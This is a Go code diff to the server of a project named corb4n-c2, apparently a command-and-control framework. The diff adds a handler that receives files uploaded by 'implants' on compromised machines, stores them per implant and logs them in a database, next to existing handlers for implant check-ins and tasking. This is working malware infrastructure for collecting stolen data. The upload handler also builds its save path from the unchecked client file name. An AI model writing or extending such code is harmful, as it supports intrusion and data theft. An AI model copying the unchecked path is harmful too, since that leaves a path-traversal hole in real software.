@@ -4,13 +4,18 @@ import (
 	"crypto/tls"
 	"encoding/json"
 	"errors"
+	"io"
+	"mime/multipart"
 	"net/http"
+	"os"
 	"path/filepath"
 
 	"github.com/dovelus/corb4n-c2/server/comunication"
 	"github.com/dovelus/corb4n-c2/server/db"
 	"github.com/gorilla/mux"
 )
+
+// TODO: Hande task results where no file is required to be uploaded
 
 type Request struct {
 	ReqType string          `json:"req_type"`
@@ -24,12 +29,21 @@ func logRequest(handler http.Handler) http.Handler {
 		handler.ServeHTTP(w, req)
 	})
 }
-
-// Handler function to process requests based on ReqType
 func requestHandler(w http.ResponseWriter, r *http.Request) {
-	// Parse the request
+	// Parse multipart form data
+	err := r.ParseMultipartForm(10 << 20) // 10 MB
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusBadRequest)
+		comunication.Logger.Errorf("failed to parse multipart form: %v", err)
+		return
+	}
+
+	// Extract req_type and JSON content
+	reqType := r.FormValue("req_type")
+	content := r.FormValue("content")
 	var req Request
-	err := json.NewDecoder(r.Body).Decode(&req)
+	req.ReqType = reqType
+	err = json.Unmarshal([]byte(content), &req.Content)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusBadRequest)
 		comunication.Logger.Errorf("failed to decode request: %v", err)
@@ -45,7 +59,7 @@ func requestHandler(w http.ResponseWriter, r *http.Request) {
 	case "GetTasksByImplantID":
 		handleGetTasksByImplantID(w, req.Content)
 	case "UploadTaskResults":
-		// TODO: Implement this
+		handleUploadTaskResults(w, r)
 	default:
 		http.Error(w, "unknown request type", http.StatusBadRequest)
 		comunication.Logger.Errorf("unknown request type: %s", req.ReqType)
@@ -54,7 +68,7 @@ func requestHandler(w http.ResponseWriter, r *http.Request) {
 
 // Handle ImplantInfo request
 func handleInsertImplantInfo(w http.ResponseWriter, content json.RawMessage) {
-	var implant *db.Implant_info
+	var implant *db.ImplantInfo
 	err := json.Unmarshal(content, &implant)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusBadRequest)
@@ -70,6 +84,7 @@ func handleInsertImplantInfo(w http.ResponseWriter, content json.RawMessage) {
 	}
 }
 
+// Handle UpdateImplantLastCheckin request
 func handleUpdateImplantLastCheckin(w http.ResponseWriter, content json.RawMessage) {
 	var data struct {
 		ID string `json:"id"`
@@ -89,6 +104,7 @@ func handleUpdateImplantLastCheckin(w http.ResponseWriter, content json.RawMessa
 	}
 }
 
+// Handle GetTasksByImplantID request
 func handleGetTasksByImplantID(w http.ResponseWriter, content json.RawMessage) {
 	var data struct {
 		ID        string `json:"id"`
@@ -125,6 +141,111 @@ func handleGetTasksByImplantID(w http.ResponseWriter, content json.RawMessage) {
 	}
 }
 
+// Handle UploadTaskResults request
+func handleUploadTaskResults(w http.ResponseWriter, r *http.Request) {
+	// Parse multipart form data
+	err := r.ParseMultipartForm(10 << 20) // 10 MB
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusBadRequest)
+		comunication.Logger.Errorf("failed to parse multipart form: %v", err)
+		return
+	}
+
+	// Extract JSON content
+	content := r.FormValue("content")
+	var data struct {
+		ID       string `json:"id"`
+		TaskID   string `json:"task_id"`
+		FileName string `json:"file_name"`
+		FileType string `json:"file_type"`
+	}
+	err = json.Unmarshal([]byte(content), &data)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusBadRequest)
+		comunication.Logger.Errorf("failed to decode upload task results request: %v", err)
+		return
+	}
+
+	// Extract file
+	file, handler, err := r.FormFile("file")
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusBadRequest)
+		comunication.Logger.Errorf("failed to get file from form: %v", err)
+		return
+	}
+	defer func(file multipart.File) {
+		err := file.Close()
+		if err != nil {
+			comunication.Logger.Errorf("failed to close file: %v", err)
+		}
+	}(file)
+
+	// Create directory for the implant if it doesn't exist
+	implantDir := filepath.Join("uploads", data.ID)
+	err = os.MkdirAll(implantDir, os.ModePerm)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		comunication.Logger.Errorf("failed to create directory for implant: %v", err)
+		return
+	}
+
+	// Save the uploaded file to the filesystem and save in the database the absolute path
+	filePath := filepath.Join(implantDir, handler.Filename)
+	dst, err := os.Create(filePath)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		comunication.Logger.Errorf("failed to create file: %v", err)
+		return
+	}
+	defer func(dst *os.File) {
+		err := dst.Close()
+		if err != nil {
+			comunication.Logger.Errorf("failed to close file: %v", err)
+		}
+	}(dst)
+
+	_, err = io.Copy(dst, file)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		comunication.Logger.Errorf("failed to save file: %v", err)
+		return
+	}
+
+	// Get file size
+	fileInfo, err := dst.Stat()
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		comunication.Logger.Errorf("failed to get file info: %v", err)
+		return
+	}
+
+	absFilePath, err := filepath.Abs(filePath)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		comunication.Logger.Errorf("failed to get absolute file path: %v", err)
+		return
+	}
+	// Store the file reference in the database
+	fileInfoDB := &db.FileInfo{
+		ImplantID: data.ID,
+		FileName:  handler.Filename,
+		FileSize:  fileInfo.Size(),
+		FileType:  data.FileType,
+		FilePath:  absFilePath,
+		CreatedAt: comunication.CurrentUnixTimestamp(),
+	}
+
+	err = db.AddFile(fileInfoDB)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		comunication.Logger.Errorf("failed to store file reference in database: %v", err)
+		return
+	}
+
+	w.WriteHeader(http.StatusOK)
+}
+
+// StartExtHTTPServer starts the external mTLS-HTTP server
 func StartExtHTTPServer() {
 	serverCertPath, err := filepath.Abs(filepath.Join("certs", "server.crt"))
 	if err != nil {
